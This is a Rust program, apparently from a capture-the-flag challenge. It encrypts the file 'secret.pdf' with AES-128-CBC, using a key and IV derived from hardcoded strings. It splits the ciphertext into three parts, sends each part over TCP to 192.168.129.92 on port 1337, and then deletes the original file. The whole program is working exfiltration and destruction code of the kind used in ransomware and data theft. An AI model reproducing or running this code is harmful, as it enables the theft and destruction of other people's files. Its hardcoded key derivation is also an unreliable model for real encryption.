use aes::Aes128;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use sha2::{Sha256, Digest};
use md5;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::convert::TryFrom;

type Aes128Cbc = Cbc<Aes128, Pkcs7>;

fn generate_key_iv() -> ([u8; 16], [u8; 16]) {
    let base = b"KleeLovesBoom";
    let salt = b"Mondstadt4Ever";

    // Key: SHA256(base + salt) → ambil 16 byte pertama
    let mut hasher = Sha256::new();
    hasher.update(base);
    hasher.update(salt);
    let hash = hasher.finalize();
    let key = <[u8; 16]>::try_from(&hash[..16]).unwrap();

    // IV: MD5(base) lalu dibalik
    let digest = md5::compute(base);
    let mut iv = digest.0;
    iv.reverse();

    (key, iv)
}

fn encrypt_file_and_split(filepath: &str) -> Vec<Vec<u8>> {
    let (key, iv) = generate_key_iv();

    let mut file = File::open(filepath).expect("Failed to open file");
    let mut data = Vec::new();
    file.read_to_end(&mut data).expect("Failed to read file");

    let cipher = Aes128Cbc::new_from_slices(&key, &iv).unwrap();
    let ciphertext = cipher.encrypt_vec(&data);

    let part_size = ciphertext.len() / 3;
    let parts = vec![
        ciphertext[..part_size].to_vec(),
        ciphertext[part_size..2 * part_size].to_vec(),
        ciphertext[2 * part_size..].to_vec(),
    ];

    parts
}

fn send_parts(parts: &[Vec<u8>], host: &str, port: u16) {
    for (i, part) in parts.iter().enumerate() {
        let address = format!("{}:{}", host, port);
        println!("[+] Sending part {}", i + 1);
        let mut stream = TcpStream::connect(&address).expect("Failed to connect to server");
        stream.write_all(part).expect("Failed to send data");
    }
}

fn destroy_original(filepath: &str) {
    fs::remove_file(filepath).expect("Failed to delete file");
}

fn main() {
    let target = "secret.pdf";
    let parts = encrypt_file_and_split(target);
    send_parts(&parts, "192.168.129.92", 1337);
    destroy_original(target);
}
